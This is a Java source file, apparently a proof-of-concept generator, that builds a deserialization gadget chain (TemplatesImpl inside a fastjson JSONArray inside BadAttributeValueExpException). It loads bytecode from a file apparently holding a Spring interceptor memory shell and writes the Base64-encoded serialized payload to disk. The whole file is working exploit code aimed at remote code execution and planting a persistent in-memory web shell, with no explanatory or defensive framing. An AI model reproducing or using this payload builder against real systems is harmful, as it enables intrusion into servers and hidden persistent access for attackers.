package POC;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class Gadget {
    public static void main(String[] args) throws IllegalAccessException, IOException {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_name", "1diOt9");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\1tmp\\memshell\\Sping_Interceptor\\BadInterceptor_within.class"));
        setFieldValue(templates, "_bytecodes", new byte[][] {bytes});

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        setFieldValue(bad, "val", jsonArray);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        new ObjectOutputStream(baos).writeObject(bad);
        String s = Base64.getEncoder().encodeToString(baos.toByteArray());
        new FileOutputStream("D://1tmp//payload.txt").write(s.getBytes());

    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws IllegalAccessException {
        Class<?> aClass = obj.getClass();
        Field field = null;
        while (aClass != null) {
            try {
                field = aClass.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e) {
                aClass = aClass.getSuperclass();
            }
        }
        field.setAccessible(true);
        field.set(obj, value);
    }
}
